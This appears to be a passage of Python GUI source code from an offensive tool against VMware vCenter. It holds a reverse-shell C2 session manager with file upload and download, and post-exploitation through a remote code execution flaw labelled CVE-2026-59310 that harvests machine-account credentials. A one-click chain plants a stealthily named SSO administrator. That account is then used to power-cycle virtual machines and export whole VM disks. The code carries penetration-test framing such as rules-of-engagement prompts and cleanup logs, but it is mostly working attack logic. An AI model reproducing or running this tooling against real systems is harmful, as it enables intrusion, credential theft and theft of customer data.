        if s:
            self.cur_sess = s
            self._term_append("== 会话 #%d (%s) ==" % (s.id, s.addr))
            self.log("[i] 当前交互会话 → #%d" % s.id, "m")

    def _c2_probe(self):
        s = self._c2_selected()
        if not s:
            messagebox.showinfo("提示", "先选中会话")
            return

        def work():
            ok = s.probe()
            self.log("[+] 会话 #%d %s" % (s.id, "存活" if ok else "已断开"),
                     "+" if ok else "!")
        self.run_bg(work, "探测")

    def _c2_close(self):
        s = self._c2_selected()
        if not s:
            return
        self.c2m.close(s.id)
        if self.cur_sess and self.cur_sess.id == s.id:
            self.cur_sess = None

    def _shell_send(self):
        cmd = self.shell_cmd.get()
        s = self.cur_sess or self._c2_selected()
        if not s:
            self._term_append("[!] 无会话：先启动监听并等待回连，双击左侧会话行接管")
            return
        self.shell_cmd.set("")
        try:
            # 不做本地回显：远端 PTY 会回显（与原始 POC 的裸 shell 循环一致），
            # 输出经实时流（_poll_term）直接上屏，ANSI 颜色码已剥离。
            s.send_line(cmd)
        except OSError as e:
            self._term_append("[!] 发送失败: %s" % e)

    def _term_append(self, text):
        self.term.configure(state="normal")
        self.term.insert("end", text if text.endswith("\n") else text + "\n")
        self.term.see("end")

    def _c2_upload(self):
        s = self.cur_sess or self._c2_selected()
        local, remote = self.up_local.get().strip(), self.up_remote.get().strip()
        if not (s and local and remote):
            messagebox.showwarning("提示", "需要会话与两侧路径")
            return

        if not os.path.isfile(local):
            messagebox.showwarning("提示", "本地文件不存在: %s" % local)
            return

        def work():
            self.log("[*] 上传 %s → %s（会话 #%d）" % (local, remote, s.id), "i")

            def prog(i, t):
                if t <= 5 or i % max(1, t // 10) == 0 or i == t:
                    self.log("  [上传 %d/%d]" % (i, t), "m")
            try:
                out = self.c2m.upload(s.id, local, remote, progress=prog)
                self.log("[+] %s" % out, "+")
            except (RuntimeError, OSError) as e:
                self.log("[!] 上传失败: %s" % e, "!")
        self.run_bg(work, "上传")

    def _c2_download(self):
        s = self.cur_sess or self._c2_selected()
        local, remote = self.up_local.get().strip(), self.up_remote.get().strip()
        if not (s and local and remote):
            messagebox.showwarning("提示", "需要会话与两侧路径")
            return

        def work():
            try:
                msg = self.c2m.download(s.id, remote, local)
                self.log("[+] %s" % msg, "+")
            except Exception as e:
                self.log("[!] 下载失败: %s" % e, "!")
        self.run_bg(work, "下载")

    # ================= Tab5 后渗透 =================
    def _build_tab_postex(self):
        f = self.tab_postex
        f.columnconfigure(0, weight=1)
        f.rowconfigure(3, weight=1)
        _bar, tv = self._target_bar(f)
        self.vpx_host = tv

        bf = ttk.LabelFrame(f, text="经 CVE-2026-59310 RCE（VAMI 回显）执行")
        bf.grid(row=1, column=0, sticky="ew", pady=4)
        for i, (key, (name, _cmd)) in enumerate(sorted(POSTEX_ACTIONS.items())):
            ttk.Button(bf, text=name, width=22,
                       command=lambda k=key: self._postex(k)).grid(
                row=i // 4, column=i % 4, padx=4, pady=2)
        ttk.Label(bf, text="传输参数取自 ② 页（syslog 端口/协议/VAMI 端口）",
                  style="Muted.TLabel").grid(row=(len(POSTEX_ACTIONS) + 3) // 4,
                                             column=0, columnspan=4, sticky="w",
                                             padx=4)

        cf = ttk.LabelFrame(f, text="自定义命令（单行，输出经 VAMI 回显取回）")
        cf.grid(row=2, column=0, sticky="ew", pady=4)
        self.postex_cmd = tk.StringVar()
        _e_px = ttk.Entry(cf, textvariable=self.postex_cmd)
        _e_px.pack(side="left", fill="x", expand=True, padx=4)
        _e_px.bind("<Return>", lambda e: self._postex("cmd"))
        ttk.Button(cf, text="执行", style="Acc.TButton",
                   command=lambda: self._postex("cmd")).pack(side="left")

        of = ttk.LabelFrame(f, text="输出 / 已收集凭据")
        of.grid(row=3, column=0, sticky="nsew", pady=4)
        credf = ttk.Frame(of)
        credf.pack(fill="x", padx=4, pady=(4, 0))
        ttk.Label(credf, text="已收集凭据:", style="Muted.TLabel").pack(side="left")
        ttk.Button(credf, text="复制全部", width=10,
                   command=self._creds_copy).pack(side="right")
        self.cred_tree = ttk.Treeview(of, columns=("key", "value"),
                                      show="headings", height=4)
        for c, t, w in (("key", "来源", 170), ("value", "凭据", 340)):
            self.cred_tree.heading(c, text=t)
            self.cred_tree.column(c, width=w, anchor="w")
        self.cred_tree.pack(fill="x", padx=4, pady=(0, 4))
        self._tree_resizable(self.cred_tree)
        self.cred_tree.bind("<Button-3>", self._cred_menu)
        ttk.Label(of, text="命令输出:", style="Muted.TLabel").pack(anchor="w", padx=6)
        self.postex_out = tk.Text(of, height=6, bg=COLORS["logbg"], fg=COLORS["fg"],
                                  relief="flat", font=(self.font_family, 9))
        self.postex_out.pack(fill="both", expand=True, padx=4, pady=4)
        ttk.Label(of, text="机器账户可用于直连 LDAPS 做任意 LDAP 操作，或作为横向凭据。"
                           "（安全边界：不含 ESXi 破坏/勒索与隐蔽持久化功能）",
                  style="Muted.TLabel").pack(anchor="w", padx=6)

    def _add_cred(self, key, value):
        """凭据统一入口：会话记录 + ⑤ 页面板同步。"""
        self.creds[key] = value
        if hasattr(self, "cred_tree"):
            self.root.after(0, lambda: self.cred_tree.insert(
                "", "end", values=(key, value)))

    def _creds_copy(self):
        if not self.creds:
            messagebox.showinfo("提示", "尚无已收集凭据")
            return
        self.root.clipboard_clear()
        self.root.clipboard_append("\n".join(
            "%s = %s" % (k, v) for k, v in self.creds.items()))
        self.log("[+] 已复制 %d 条凭据" % len(self.creds), "+")

    def _postex(self, key):
        host = self.vpx_host.get().strip().split(":")[0]
        if not host:
            messagebox.showwarning("提示", "需要目标")
            return
        if key == "cmd":
            cmd = self.postex_cmd.get()
            if not cmd or "\n" in cmd:
                messagebox.showwarning("提示", "需要单行命令")
                return
            name = "自定义"
        else:
            name, cmd = POSTEX_ACTIONS[key]
        tag = rand_name(6)
        try:
            vport = int(self.v510_vport.get() or 5480)
            port = int(self.v510_port.get() or 514)
        except ValueError:
            messagebox.showwarning("提示", "② 页端口设置需为数字")
            return
        self.stop_flag.clear()
        proxy = self.http_proxy.get().strip() or None
        tcp = self.v510_proto.get() in ("TCP", "TLS")
        tls = self.v510_proto.get() == "TLS"

        def work():
            self.log("[*] 后渗透[%s] → %s : %s" % (name, host, cmd), "i")
            ok, text = rce_readback(host, port, cmd, tag, tcp=tcp, tls=tls,
                                    vami_port=vport, proxy=proxy,
                                    poll_cb=lambda s: self.log(s, "m"),
                                    stop_flag=self.stop_flag)
            if not ok:
                self.log("[!] %s" % text, "!")
                return
            self.log("[+] %s 输出已取回" % name, "+")

            def _show(text=text):
                self.postex_out.delete("1.0", "end")
                self.postex_out.insert("1.0", text)
            self.root.after(0, _show)
            if key == "machine-creds":
                self._add_cred("机器账户@%s" % host, text.strip()[:600])
                self.log("[+] 机器账户凭据已存入会话记录", "+")
            if key == "sso-domain" and text.strip():
                dom = text.strip().splitlines()[0]
                self.root.after(0, lambda d=dom: self.v590_cbase.set(
                    "dc=" + ",dc=".join(d.split("."))))
                self.log("[i] ③ 页 Base DN 已自动填充为 %s" % dom, "m")
            self.record("59310-后渗透", host, name,
                        "rm -f /opt/vmware/share/htdocs/r%s.txt "
                        "/etc/cron.d/cve59310%s*" % (tag, tag))
        self.run_bg(work, "后渗透")

    # ================= Tab8 一键打通 =================
    def _build_tab_chain(self):
        f = self.tab_chain
        f.columnconfigure(0, weight=1)
        f.columnconfigure(1, weight=1)
        f.rowconfigure(1, weight=1)
        _bar, tv = self._target_bar(f)
        self.vch_host = tv

        left = ttk.Frame(f)
        left.grid(row=1, column=0, sticky="nsew", padx=(0, 6))
        right = ttk.Frame(f)
        right.grid(row=1, column=1, sticky="nsew", padx=(6, 0))

        pf = ttk.LabelFrame(left, text="交付账户（新建管理员）")
        pf.pack(fill="x", pady=4)
        ttk.Label(pf, text="用户名").grid(row=0, column=0, padx=4, sticky="w")
        self.vch_user = tk.StringVar(value=stealth_user())
        ttk.Entry(pf, textvariable=self.vch_user, width=15).grid(
            row=0, column=1, sticky="ew")
        ttk.Label(pf, text="密码").grid(row=1, column=0, padx=4, sticky="w")
        self.vch_pass = tk.StringVar(value=rand_name(10) + "!Aa1" + rand_name(2))
        ttk.Entry(pf, textvariable=self.vch_pass, width=15).grid(
            row=1, column=1, sticky="ew")
        ttk.Button(pf, text="↻ 重新随机", width=12,
                   command=lambda: (self.vch_user.set("pentest_" + rand_name(4)),
                                    self.vch_pass.set(rand_name(10) + "!Aa1"
                                                      + rand_name(2)))).grid(
            row=2, column=0, columnspan=2, sticky="we", padx=4, pady=2)
        pf.columnconfigure(1, weight=1)

        cf = ttk.LabelFrame(left, text="路径开关")
        cf.pack(fill="x", pady=4)
        self.vch_use10 = tk.BooleanVar(value=True)
        self.vch_use09 = tk.BooleanVar(value=True)
        self.vch_inv = tk.BooleanVar(value=True)
        ttk.Checkbutton(cf, text="路径 A：59310 RCE → 机器账户接管（首选）",
                        variable=self.vch_use10).pack(anchor="w", padx=6, pady=2)
        ttk.Checkbutton(cf, text="路径 B：59309 SRP 绕过（A 失败时降级）",
                        variable=self.vch_use09).pack(anchor="w", padx=6, pady=2)
        ttk.Checkbutton(cf, text="交付后自动盘点（vSphere REST 只读清单）",
                        variable=self.vch_inv).pack(anchor="w", padx=6, pady=2)
        ttk.Label(cf, text="SSO 域名自动从机器账户 DN 推导；59310 传输参数取自 ② 页。",
                  style="Muted.TLabel", wraplength=int(500 * self.S),
                  justify="left").pack(anchor="w", padx=6, pady=2)

        af2 = ttk.LabelFrame(left, text="账号库（持久化 · 多机共用同一账户）")
        af2.pack(fill="x", pady=4)
        self.chain_acc = tk.StringVar()
        _acc_cb = ttk.Combobox(af2, textvariable=self.chain_acc, state="readonly")
        _acc_cb.pack(side="left", fill="x", expand=True, padx=4)
        self.chain_acc_cb = _acc_cb
        _abar = ttk.Frame(af2)
        _abar.pack(fill="x", padx=4, pady=(0, 3))
        ttk.Button(_abar, text="刷新", width=6,
                   command=self._acc_refresh).pack(side="left")
        ttk.Button(_abar, text="用作交付账户", width=14,
                   command=self._acc_use_chain).pack(side="left", padx=4)
        ttk.Button(_abar, text="删除选中", width=10,
                   command=self._acc_del).pack(side="left")
        self._acc_refresh()

        bf = ttk.LabelFrame(left, text="执行")
        bf.pack(fill="x", pady=4)
        ttk.Button(bf, text="开始一键打通 [F7]", style="Acc.TButton",
                   command=self._chain_run).pack(fill="x", padx=4, pady=4)
        ttk.Button(bf, text="导出测试报告（Markdown）", command=self._chain_report).pack(
            fill="x", padx=4, pady=2)
        ttk.Button(bf, text="取消 [Esc]", command=self._cancel).pack(
            fill="x", padx=4, pady=2)
        nf = ttk.LabelFrame(left, text="流程")
        nf.pack(fill="both", expand=True, pady=4)
        ttk.Label(nf, text="S0 指纹 → S1 59310 RCE → S2 机器账户+SSO 域 →\n"
                           "S3 目录接管（机器账户 bind → 59309 降级）→\n"
                           "S4 新建管理员+入组 → S5 bind 回验+组成员确认 →\n"
                           "S6 交付卡片+自动登记清理。\n\n"
                           "安全边界：交付账户即终点，不做后续动作与持久化。",
                  style="Muted.TLabel", wraplength=int(500 * self.S),
                  justify="left").pack(anchor="w", padx=6, pady=4)

        rf = ttk.LabelFrame(right, text="交付卡片")
        rf.pack(fill="both", expand=True, pady=4)
        self.vch_out = tk.Text(rf, bg=COLORS["logbg"], fg=COLORS["fg"],
                               relief="flat", highlightthickness=1,
                               highlightbackground=COLORS["border"],
                               highlightcolor=COLORS["border"],
                               font=(self.font_family, 9))
        self.vch_out.pack(fill="both", expand=True, padx=4, pady=4)
        self.vch_out.insert("1.0", "（尚未执行）\n\n填入目标 IP 后点击「开始一键打通」。\n"
                                   "典型耗时 2-4 分钟（crond 分钟粒度，2-3 次 RCE）。\n"
                                   "完成后此处显示可登录 /ui 的管理员账户。")

    def _chain_run(self):
        from .chain import run_chain
        host = self.vch_host.get().strip().split(":")[0]
        if not host:
            messagebox.showwarning("提示", "需要目标")
            return
        user = self.vch_user.get().strip() or None
        password = self.vch_pass.get().strip() or None
        use10, use09 = self.vch_use10.get(), self.vch_use09.get()
        inv = self.vch_inv.get()
        try:
            vport = int(self.v510_vport.get() or 5480)
            port = int(self.v510_port.get() or 514)
        except ValueError:
            messagebox.showwarning("提示", "② 页端口设置需为数字")
            return
        proxy = self.http_proxy.get().strip() or None
        self.stop_flag.clear()
        self.log("[*] 一键打通开始 → %s（路径A=%s 路径B=%s 盘点=%s）"
                 % (host, use10, use09, inv), "i")

        def work():
            r = run_chain(host, user=user, password=password,
                          use_59310=use10, use_59309=use09,
                          syslog_port=port, proto=self.v510_proto.get().lower(),
                          vami_port=vport, proxy=proxy, inventory=inv,
                          log=lambda s: self.log(s, "m"),
                          stop_flag=self.stop_flag)
            self.chain_result = r
            card = r.card

            def _show():
                self.vch_out.delete("1.0", "end")
                self.vch_out.insert("1.0", card)
            self.root.after(0, _show)
            if r.upn:
                self.record("chain-管理员账户", host, r.upn,
                            "ldapdelete '%s'" % r.udn)
                self._add_cred("SSO管理员@%s" % host, "%s / %s" % (r.upn, r.password))
                self.root.after(0, lambda h=host, u=r.upn, p2=r.password:
                                self._acc_add(h, u, p2, source="chain"))
            if r.ok:
                self.log("[+] 一键打通完成（%s）" % r.via, "+")

                def _prefill(upn=r.upn, pw=r.password):
                    # ⑨ vSphere 管理页自动预填交付账户（旧连接必须失效）
                    self._vv_conn = None
                    self.vv_host.set(host)
                    self.vv_user.set(upn)
                    self.vv_pass.set(pw)
                self.root.after(0, _prefill)
            else:
                self.log("[!] 一键打通未成功，各阶段明细见上方与日志", "!")
        self.run_bg(work, "一键打通")

    def _chain_report(self):
        r = getattr(self, "chain_result", None)
        if not r:
            messagebox.showinfo("提示", "先执行一次「开始一键打通」")
            return
        f = filedialog.asksaveasfilename(
            defaultextension=".md",
            initialfile="vc-strike-report-%s.md" % time.strftime("%Y%m%d-%H%M%S"))
        if not f:
            return
        try:
            with open(f, "w", encoding="utf-8") as fp:
                fp.write(r.report_markdown())
            self.log("[+] 测试报告已导出: %s" % f, "+")
        except OSError as e:
            self.log("[!] 报告导出失败: %s" % e, "!")

    # ================= Tab9 vSphere 管理 =================
    def _build_tab_vops(self):
        f = self.tab_vops
        f.columnconfigure(0, weight=3)
        f.columnconfigure(1, weight=2)
        f.rowconfigure(1, weight=1)
        _bar, tv = self._target_bar(f)
        self.vv_host = tv

        left = ttk.Frame(f)
        left.grid(row=1, column=0, sticky="nsew", padx=(0, 6))
        right = ttk.Frame(f)
        right.grid(row=1, column=1, sticky="nsew", padx=(6, 0))

        lf = ttk.LabelFrame(left, text="账户（交付的 SSO 管理员或其它有效账户）")
        lf.pack(fill="x", pady=4)
        ttk.Label(lf, text="账户:").pack(side="left", padx=4)
        self.vv_user = tk.StringVar()
        ttk.Entry(lf, textvariable=self.vv_user, width=22).pack(
            side="left", fill="x", expand=True, padx=2)
        ttk.Label(lf, text="密码:").pack(side="left", padx=4)
        self.vv_pass = tk.StringVar()
        ttk.Entry(lf, textvariable=self.vv_pass, width=18, show="*").pack(
            side="left", padx=2)
        ttk.Button(lf, text="登录 [F9]", style="Acc.TButton",
                   command=self._vv_refresh).pack(side="left", padx=6)

        vf = ttk.LabelFrame(left, text="虚拟机清单（只读）")
        vf.pack(fill="both", expand=True, pady=4)
        wrapf = ttk.Frame(vf)
        wrapf.pack(fill="both", expand=True, padx=4, pady=4)
        self.vv_tree = ttk.Treeview(wrapf, columns=("power", "cpu", "mem", "vmid"),
                                    show="tree headings")
        self.vv_tree.heading("#0", text="名称")
        for c, t, w in (("power", "电源", 90), ("cpu", "vCPU", 50),
                        ("mem", "内存MiB", 70), ("vmid", "VM-ID", 200)):
            self.vv_tree.heading(c, text=t)
            self.vv_tree.column(c, width=w, anchor="w")
        sy = ttk.Scrollbar(wrapf, orient="vertical",
                           command=self.vv_tree.yview)
        sx = ttk.Scrollbar(wrapf, orient="horizontal",
                           command=self.vv_tree.xview)
        self.vv_tree.pack(side="left", fill="both", expand=True)
        sy.pack(side="left", fill="y")
        sx.pack(side="bottom", fill="x")
        self.vv_tree.configure(yscrollcommand=sy.set, xscrollcommand=sx.set)
        self._tree_resizable(self.vv_tree)

        rf = ttk.LabelFrame(right, text="只读检查")
        rf.pack(fill="x", pady=4)
        rbar = ttk.Frame(rf)
        rbar.pack(fill="x", padx=4, pady=2)
        ttk.Button(rbar, text="VM 详情", command=self._vv_detail).pack(
            side="left", padx=2)
        ttk.Button(rbar, text="磁盘清单", command=self._vv_disks).pack(
            side="left", padx=2)
        ttk.Button(rbar, text="快照清单", command=self._vv_snaps).pack(
            side="left", padx=2)
        ttk.Button(rbar, text="数据存储容量", command=self._vv_ds).pack(
            side="left", padx=2)
        ttk.Label(rf, text="VM-ID 取自左侧清单的 VM-ID 列（双击行可复制）。",
                  style="Muted.TLabel").pack(anchor="w", padx=6, pady=(0, 2))

        of = ttk.LabelFrame(right, text="电源操作（单台 · 写操作 · 全程审计）")
        of.pack(fill="x", pady=4)
        obar = ttk.Frame(of)
        obar.pack(fill="x", padx=4, pady=2)
        ttk.Label(obar, text="动作:").pack(side="left")
        self.vv_action = tk.StringVar(value="start")
        ttk.Combobox(obar, textvariable=self.vv_action,
                     values=["start", "stop", "suspend", "reset"], width=9,
                     state="readonly").pack(side="left", padx=4)
        ttk.Label(obar, text="输入 VM-ID 确认:").pack(side="left", padx=(8, 2))
        self.vv_confirm = tk.StringVar()
        ttk.Entry(obar, textvariable=self.vv_confirm, width=16).pack(
            side="left", fill="x", expand=True, padx=2)
        ttk.Button(of, text="执行电源操作（需输入与 VM-ID 完全一致的标识）",
                   style="Danger.TButton", command=self._vv_power).pack(
            fill="x", padx=4, pady=2)
        self._wrap_lbl(of, "护栏：仅单台、需输入完整 VM-ID 确认、动作全程入日志"
                           "并登记 ⑥ 清理中心；不做批量操作。授权报告注明影响即可，"
                           "请在 RoE 允许范围内使用。")
        ef = ttk.LabelFrame(right, text="导出 VM（OVF/OVA，单台，经本机 ovftool）")
        ef.pack(fill="x", pady=4)
        ebar = ttk.Frame(ef)
        ebar.pack(fill="x", padx=4, pady=2)
        ttk.Label(ebar, text="导出到:").pack(side="left")
        self.vv_dest = tk.StringVar(value=os.path.join(
            os.path.expanduser("~"), "Documents"))
        ttk.Entry(ebar, textvariable=self.vv_dest, width=20).pack(
            side="left", fill="x", expand=True, padx=2)
        ttk.Button(ebar, text="浏览", width=6,
                   command=lambda: self.vv_dest.set(
                       filedialog.askdirectory() or self.vv_dest.get())).pack(
            side="left")
        ebar2 = ttk.Frame(ef)
        ebar2.pack(fill="x", padx=4, pady=2)
        ttk.Label(ebar2, text="VM 名称:", style="Muted.TLabel").pack(side="left")
        self.vv_expname = tk.StringVar()
        ttk.Entry(ebar2, textvariable=self.vv_expname, width=18).pack(
            side="left", padx=4)
        ttk.Button(ebar2, text="取选中 VM 名称",
                   command=lambda: self._vv_fillname()).pack(side="left", padx=2)
        ttk.Button(ebar2, text="开始导出（耗时与磁盘成正比）",
                   style="Acc.TButton", command=self._vv_export).pack(
            side="left", padx=6)
        self._wrap_lbl(ef, "导出走 VMware 官方 ovftool（需本机已安装，自动检测）"
                           "经 443 拉取到本机；仅单台，全程审计。大文件耗时与"
                           "磁盘成正比，Esc 可中止。")

        xf = ttk.LabelFrame(right, text="输出")
        xf.pack(fill="both", expand=True, pady=4)
        self.vv_out = tk.Text(xf, height=10, bg=COLORS["logbg"], fg=COLORS["fg"],
                              relief="flat", highlightthickness=1,
                              highlightbackground=COLORS["border"],
                              highlightcolor=COLORS["border"],
                              font=(self.font_family, 9))
        self.vv_out.pack(fill="both", expand=True, padx=4, pady=4)
        self._vv_conn = None      # 已登录的 VCenterRest（登录后复用）

    def _confirm_threadsafe(self, msg):
        """后台线程弹出确认框：调度到主线程并阻塞等结果。"""
        ev = threading.Event()
        box = {"r": False}

        def ask():
            try:
                box["r"] = messagebox.askyesno("需要关机", msg)
            except Exception:
                box["r"] = False
            ev.set()
        self.root.after(0, ask)
        ev.wait(timeout=300)
        return box["r"]

    def _vv_out_append(self, text):
        self.vv_out.insert("end", text if text.endswith("\n") else text + "\n")
        self.vv_out.see("end")

    def _vv_client(self, host, user, password):
        """返回已登录连接；未登录则现场登录（仅后台线程调用）。"""
        from .mgmt import VCenterRest, MgmtError
        if self._vv_conn is not None and \
                self._vv_conn.host == host and \
                getattr(self._vv_conn, "_user", "") == user:
            return self._vv_conn
        self._vv_conn = None
        return self._vv_connect(host, user, password)

    def _vv_connect(self, host, user, password):
        from .mgmt import VCenterRest, MgmtError
        if not host or not user:
            raise MgmtError("需要目标与账户")
        c = VCenterRest(host, 443)
        c.login(user, password)
        self._vv_conn = c
        return c

    def _vv_creds(self):
        return (self.vv_host.get().strip().split(":")[0],
                self.vv_user.get().strip(), self.vv_pass.get())

    def _vv_refresh(self):
        host, user, password = self._vv_creds()

        def work():
            try:
                c = self._vv_client(host, user, password)
            except Exception as e:
                self.log("[!] 登录失败: %s" % e, "!")
                return
            try:
                rows = c.vms()
            except Exception as e:
                # 该 vCenter 版本对 /rest/vcenter/vm 支持不完整（6.x 常见）→
                # 降级为全端点尝试，能采多少展示多少
                self.log("[!] VM 清单端点失败: %s" % e, "!")
                self.log("[*] 降级为全端点尝试…", "m")
                try:
                    fallback = c.summary(log=lambda s: self.log(s, "m"))
                except Exception as e2:
                    self.log("[!] 降级盘点也失败: %s" % e2, "!")
                    return

                def _fill_fb(fallback=fallback):
                    self.vv_tree.delete(*self.vv_tree.get_children())
                    self._vv_out_append(fallback)
                self.root.after(0, _fill_fb)
                self.log("[i] 已展示可用的部分清单（明细见输出区）", "m")
                return

            def _fill():
                self.vv_tree.delete(*self.vv_tree.get_children())
                for name, power, cpu, mem, vmid in rows:
                    self.vv_tree.insert("", "end", text=name,
                                        values=(power, cpu, mem, vmid))
                self._vv_out_append("== 清单刷新完成：%d 台 VM ==" % len(rows))
            self.root.after(0, _fill)
            self.log("[+] vSphere 清单已刷新：%d 台 VM（%s）"
                     % (len(rows), self.vv_host.get()), "+")
        self.run_bg(work, "清单刷新")

    def _vv_sel(self):
        sel = self.vv_tree.selection()
        if not sel:
            messagebox.showinfo("提示", "先在清单中选择一台 VM")
            return None
        vals = self.vv_tree.item(sel[0], "values")
        name = self.vv_tree.item(sel[0], "text")
        return vals[3], name          # vmid, name

    def _vv_run_read(self, title, fn):
        """只读检查统一入口：主线程取凭据，401 自动重登一次。"""
        from .mgmt import MgmtError
        host, user, password = self._vv_creds()

        def work():
            try:
                try:
                    c = self._vv_client(host, user, password)
                    out = fn(c)
                except MgmtError as e:
                    s = str(e)
                    if "401" in s or "认证失败" in s:
                        self._vv_conn = None
                        c = self._vv_connect(host, user, password)
                        out = fn(c)
                    else:
                        raise
                self.root.after(0, lambda: self._vv_out_append(out))
                self.log("[+] %s 完成" % title, "+")
            except Exception as e:
                self.log("[!] %s 失败: %s" % (title, e), "!")
        self.run_bg(work, title)

    def _vv_detail(self):
        sel = self._vv_sel()
        if not sel:
            return
        vmid, _name = sel
        self._vv_run_read("VM 详情", lambda c: "\n".join(
            "  %s: %s" % (k, v) for k, v in c.vm_detail(vmid).items()))

    def _vv_disks(self):
        sel = self._vv_sel()
        if not sel:
            return
        vmid, _name = sel
        self._vv_run_read("磁盘清单", lambda c: "\n".join(
            ["  磁盘（%d）:" % len(c.vm_disks(vmid))] +
            ["    · " + " | ".join(r) for r in c.vm_disks(vmid)]))

    def _vv_snaps(self):
        sel = self._vv_sel()
        if not sel:
            return
        vmid, _name = sel

        def fn(c):
            rows = c.vm_snapshots(vmid)
            if not rows:
                return "  快照：无"
            return "\n".join(["  快照（%d）——陈旧快照建议列入风险发现:" % len(rows)] +
                             ["    · " + " | ".join(r) for r in rows])
        self._vv_run_read("快照清单", fn)

    def _vv_ds(self):
        self._vv_run_read("数据存储容量", lambda c: "\n".join(
            ["  数据存储（%d）:" % len(c.datastores())] +
            ["    · " + " | ".join(r) for r in c.datastores()]))

    def _vv_power(self):
        sel = self._vv_sel()
        if not sel:
            messagebox.showinfo("提示", "先在清单中选择一台 VM")
            return
        vmid, name = sel
        action = self.vv_action.get()
        confirm = self.vv_confirm.get().strip()
        if confirm != vmid:
            messagebox.showwarning(
                "提示", "确认失败：请输入与 VM-ID 完全一致的标识后重试\n"
                        "（当前 VM: %s，VM-ID: %s）" % (name, vmid))
            return
        if not messagebox.askyesno(
                "二次确认",
                "对 %s（%s）执行电源操作「%s」？\n这是对客户资产的写操作，"
                "请确认 RoE 允许。" % (name, vmid, action)):
            return
        host, user, password = self._vv_creds()

        def work():
            from .mgmt import MgmtError
            try:
                try:
                    c = self._vv_client(host, user, password)
                    ok, detail = c.power_set(vmid, action)
                except MgmtError as e:
                    s = str(e)
                    if "401" in s or "认证失败" in s:
                        self._vv_conn = None
                        c = self._vv_connect(host, user, password)
                        ok, detail = c.power_set(vmid, action)
                    else:
                        raise
                msg = "电源[%s] %s（%s）→ %s" % (action, name, vmid, detail)
                if ok and action in ("start", "reset"):
                    msg += "，当前状态 %s" % c.power_get(vmid)
                elif action == "stop":
                    msg += "（软关机发起，状态需数秒后复查）"
                self.root.after(0, lambda: self._vv_out_append(msg))
                self.log("[%s] %s" % ("+" if ok else "!", msg),
                         "+" if ok else "!")
                self.record("vops-电源", host, "%s %s" % (action, name),
                            "（写操作；如需恢复请执行相反动作）")
            except Exception as e:
                self.log("[!] 电源操作失败: %s" % e, "!")
        self.run_bg(work, "电源操作")

    def _vv_fillname(self):
        sel = self._vv_sel()
        if sel:
            self.vv_expname.set(sel[1])

    def _vv_export(self):
        from .mgmt import MgmtError, find_ovftool
        host, user, password = self._vv_creds()
        vm_name = self.vv_expname.get().strip()
        dest_dir = self.vv_dest.get().strip()
        if not (host and vm_name and dest_dir):
            messagebox.showwarning("提示", "需要目标、VM 名称与导出目录")
            return
        ovftool = find_ovftool()
        if not ovftool:
            messagebox.showwarning(
                "未找到 ovftool",
                "本机未安装 VMware OVF Tool。\n安装后重试，或手工导出：\n"
                "https://<vcenter>/ui → VM → 操作 → 导出")
            return
        if not messagebox.askyesno(
                "确认导出",
                "将 %s 的 %s 导出为 OVA 到：\n%s\n\n"
                "导出包含客户虚拟机整盘数据——请确认 RoE 允许且磁盘空间充足。\n"
                "若 VM 处于开机状态：将自动关机 → 导出 → 自动恢复开机。\n"
                "继续？" % (host, vm_name, dest_dir)):
            return
        self.stop_flag.clear()

        def work():
            try:
                try:
                    c = self._vv_client(host, user, password)
                    ok, detail = c.export_vm_ovftool(
                        vm_name, dest_dir, ovftool=ovftool,
                        log=lambda s: self.log(s, "m"),
                        stop_flag=self.stop_flag, auto_power=True,
                        power_confirm_cb=self._confirm_threadsafe)
                except MgmtError as e:
                    s = str(e)
                    if "401" in s or "认证失败" in s:
                        self._vv_conn = None
                        c = self._vv_connect(host, user, password)
                        ok, detail = c.export_vm_ovftool(
                            vm_name, dest_dir, ovftool=ovftool,
                            log=lambda s: self.log(s, "m"),
                            stop_flag=self.stop_flag, auto_power=True,
                            power_confirm_cb=self._confirm_threadsafe)
                    else:
                        raise
                self.root.after(0, lambda: self._vv_out_append(
                    "[%s] 导出 %s：%s" % ("+" if ok else "!", vm_name, detail)))
                self.log("[%s] 导出 %s：%s" % ("+" if ok else "!", vm_name, detail),
                         "+" if ok else "!")
                if ok:
                    self.record("vops-导出", host, vm_name,
                                "（OVA 在本机 %s，属交付物）" % dest_dir)
            except Exception as e:
                self.log("[!] 导出失败: %s" % e, "!")
        self.run_bg(work, "导出")

    # ---------- 右键菜单（通用） ----------
    @staticmethod
    def _copy_text(text, label="内容"):
        import tkinter as _tk
        root = _tk._default_root
        root.clipboard_clear()
        root.clipboard_append(text)
        logutil.write("+", "[右键] 已复制%s: %s" % (label, text[:80]))

    def _scan_menu(self, event):
        row = self.scan_tree.identify_row(event.y)
        if row:
            self.scan_tree.selection_set(row)
        sel = self.scan_tree.selection()
        if not sel:
            return
        host = self.scan_tree.item(sel[0], "values")[0]
        menu = tk.Menu(self, tearoff=0)
        menu.add_command(label="设为当前目标",
                         command=self._tgt_setcur)
        menu.add_command(label="指纹此目标（单台）",
                         command=lambda: self._scan_one(host))
        menu.add_separator()
        menu.add_command(label="复制主机",
                         command=lambda: self._copy_text(host, "主机"))
        menu.add_command(label="移除此行", command=self._tgt_del)
        menu.tk_popup(event.x_root, event.y_root)

    def _scan_one(self, host):
        proxy = self.http_proxy.get().strip() or None

        def work():
            try:
                r = probe_target(host, proxy=proxy, log=self.log)
            except Exception as e:
                self.log("[!] %s 指纹失败: %r" % (host, e), "!")
                return
            self.scan_results[host] = r
            vals = (r["host"], "●" if r["443"] else "", "●" if r["5480"] else "",
                    "●" if r["514tcp"] else "", "●" if r["1514"] else "",
                    "●" if r["389"] else "", "●" if r["636"] else "",
                    "●" if r["2020"] else "",
                    r["api"] or "", r["mechs"] or "", r["nc"] or "", r["conclusion"])

            def upd():
                for iid in self.scan_tree.get_children():
                    if self.scan_tree.item(iid, "values")[0] == host:
                        self.scan_tree.item(iid, values=vals)
                        break
            self.root.after(0, upd)
            self.log("[+] %s → %s" % (host, r["conclusion"]), "+")
        self.run_bg(work, "单台指纹")

    def _v590_menu(self, event):
        row = self.v590_tree.identify_row(event.y)
        if not row:
            return
        self.v590_tree.selection_set(row)
        dn = self.v590_tree.item(row, "text")
        attrs = self.v590_tree.set(row, "attrs")
        menu = tk.Menu(self, tearoff=0)
        menu.add_command(label="复制 DN",
                         command=lambda: self._copy_text(dn, "DN"))
        menu.add_command(label="设为重置密码目标 DN",
                         command=lambda: self.v590_rstuser.set(dn))
        menu.add_command(label="删除该账户（ldapdelete）",
                         command=lambda: (self.v590_delentry.set(dn),
                                          self._b309_delete()))
        menu.add_separator()
        upn = ""
        m2 = re.search(r"userPrincipalName=([^|]+)", attrs)
        if m2:
            upn = m2.group(1).strip()
